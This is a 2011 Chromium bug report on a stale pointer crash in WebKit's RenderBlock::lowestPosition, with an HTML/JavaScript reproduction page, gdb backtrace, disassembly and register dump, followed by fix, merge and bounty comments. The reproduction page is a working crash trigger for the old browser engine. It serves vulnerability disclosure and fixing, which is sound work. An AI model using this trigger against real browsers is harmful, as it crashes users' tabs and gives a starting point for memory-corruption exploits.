# Stale pointer in WebCore::RenderBlock::lowestPosition

| Field | Value |
|-------|-------|
| **Issue ID** | [40088050](https://issues.chromium.org/issues/40088050) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink |
| **Reporter** | ma...@gmail.com |
| **Assignee** | in...@chromium.org |
| **Created** | 2011-02-17 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

After performing certain HTML DOM operations, chromium will crash (instruction fetch at null), likely due to a stale pointer in WebCore::RenderBlock::lowestPosition.

**VERSION**  

Chrome Version: Chromium 9.0.597.94 Ubuntu 10.04 (64-bit)

**REPRODUCTION CASE**

<html>
<body onload="boom();">
<script type="text/javascript">
function boom() {
arbitrary0 = document.createElement('arbitrary');
document.documentElement.appendChild(arbitrary0);
colgroup = document.createElement('colgroup');
arbitrary1 = document.createElement('arbitrary');
arbitrary1.style.float = 'left';
arbitrary1.appendChild(document.createTextNode('a'));
li = document.createElement('li');
li.style.position = 'fixed';
arbitrary2 = document.createElement('arbitrary');
arbitrary3 = document.createElement('arbitrary');
arbitrary0.appendChild(arbitrary2);
arbitrary2.appendChild(colgroup);
arbitrary0.appendChild(arbitrary1);
document.body.offsetTop;
arbitrary2.appendChild(li);
document.body.offsetTop;
arbitrary3.appendChild(arbitrary0);
}
</script>
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab

$ chromium-browser --debug --single-process crash.html

(gdb) run

Program received signal SIGSEGV, Segmentation fault.  

[Switching to Thread 0x7fffe31a2700 (LWP 29458)]  

0x0000000000000000 in ?? ()  

(gdb) bt  

#0 0x0000000000000000 in ?? ()  

#1 0x00007ffff687f015 in WebCore::RenderBlock::lowestPosition (  

this=0x7ffff8f56578, includeOverflowInterior=false, includeSelf=true,  

applyTransform=<value optimized out>)  

at third\_party/WebKit/WebCore/rendering/RenderBlock.cpp:3535  

#2 0x00007ffff687f1b6 in WebCore::RenderBlock::lowestPosition (  

this=0x7ffff8f56320, includeOverflowInterior=true, includeSelf=true,  

applyTransform=<value optimized out>)  

at third\_party/WebKit/WebCore/rendering/RenderBlock.cpp:3488  

#3 0x00007ffff6929130 in WebCore::RenderView::docHeight (this=0x7ffff8f56dd0)  

at third\_party/WebKit/WebCore/rendering/RenderView.cpp:622  

#4 0x00007ffff692b02b in WebCore::RenderView::layout (this=0x7ffff8f56320)  

at third\_party/WebKit/WebCore/rendering/RenderView.cpp:135  

#5 0x00007ffff6836527 in WebCore::FrameView::layout (this=0x0,  

allowSubtree=<value optimized out>)  

at third\_party/WebKit/WebCore/page/FrameView.cpp:828

(gdb) frame 1  

#1 0x00007ffff687f015 in WebCore::RenderBlock::lowestPosition (  

this=0x7ffff8f56578, includeOverflowInterior=false, includeSelf=true,  

applyTransform=<value optimized out>)  

at third\_party/WebKit/WebCore/rendering/RenderBlock.cpp:3535  

3535 third\_party/WebKit/WebCore/rendering/RenderBlock.cpp: No such file or directory.  

in third\_party/WebKit/WebCore/rendering/RenderBlock.cpp  

(gdb) disas  

...  

0x00007ffff687effa <+698>: nopw 0x0(%rax,%rax,1)  

0x00007ffff687f000 <+704>: mov (%rdx),%rdi  

0x00007ffff687f003 <+707>: mov 0xc(%rdx),%r13d  

0x00007ffff687f007 <+711>: mov (%rdi),%rax  

0x00007ffff687f00a <+714>: mov %rdx,0x8(%rsp)  

0x00007ffff687f00f <+719>: callq \*0x4e8(%rax)  

=> 0x00007ffff687f015 <+725>: mov 0x8(%rsp),%rdx  

0x00007ffff687f01a <+730>: mov %eax,0x14(%rsp)

(gdb) i r  

rax 0x7ffff8f56a40 140737370221120  

rbx 0x7ffff8f56578 140737370219896  

rcx 0x0 0  

rdx 0x7ffff91625a0 140737372366240  

rsi 0x7ffff92257c0 140737373165504  

rdi 0x7ffff8f56dd0 140737370222032  

rbp 0x7fffe31a1250 0x7fffe31a1250  

rsp 0x7fffe31a1220 0x7fffe31a1220  

r8 0x0 0  

r9 0x0 0  

r10 0x0 0  

r11 0x0 0  

r12 0x1c 28  

r13 0x8 8  

r14 0x1 1  

r15 0x0 0  

rip 0x7ffff687f015 0x7ffff687f015 <WebCore::RenderBlock::lowestPosition(bool, bool, WebCore::RenderBox::ApplyTransform) const+725>  

eflags 0x10202 [ IF RF ]  

cs 0x33 51  

ss 0x2b 43  

ds 0x0 0  

es 0x0 0  

fs 0x0 0  

gs 0x0 0

(gdb) info locals  

r = <value optimized out>  

it = {impl = {list = 0x7ffff92257c0, node = 0x7ffff9162540, next = 0x0,  

prev = 0x0}}  

transformedRect = {m\_location = {m\_x = 0, m\_y = 0}, m\_size = {m\_width = 0,  

m\_height = 8}}  

transformedBottom = <value optimized out>  

bottom = 28  

relativeOffset = 0  

(gdb)

The reproduction case and full trace in gdb are attached.

## Attachments

- [gdb.txt](attachments/gdb.txt) (text/plain; charset=us-ascii, 21.7 KB)
- [crash.html](attachments/crash.html) (text/html; charset=us-ascii, 811 B)

## Timeline

### in...@chromium.org (2011-02-17)

[Empty comment from Monorail migration]

### in...@chromium.org (2011-02-17)

I understand this.

### in...@chromium.org (2011-02-17)

Fixed in http://trac.webkit.org/changeset/78775

### js...@chromium.org (2011-02-17)

Just for completeness, the upstream bug is: https://bugs.webkit.org/show_bug.cgi?id=54601

### in...@chromium.org (2011-02-17)

[Empty comment from Monorail migration]

### in...@chromium.org (2011-02-17)

We should probably merge this to m9.

### in...@chromium.org (2011-02-17)

Merged to m9 in r78920

Still needs m10 merge.

### sc...@gmail.com (2011-02-18)

Nice catch Marty. Thanks to the quality of the report (repro, stack trace, disassembly etc.), I'm happy to provisionally reward another $1000 :)

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### js...@chromium.org (2011-02-28)

[Empty comment from Monorail migration]

### ch...@gmail.com (2011-02-28)

merged to m10 as http://trac.webkit.org/changeset/79902

### sc...@gmail.com (2011-03-04)

Invoice finalized; payment is in e-payment system.

### js...@chromium.org (2011-03-21)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-10-05)

Batch update.

### js...@chromium.org (2012-04-18)

Lifting view restrictions.

### js...@chromium.org (2012-04-18)

[Empty comment from Monorail migration]

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-06)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### is...@google.com (2016-10-02)

This issue was migrated from crbug.com/chromium/73235?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40088050)*
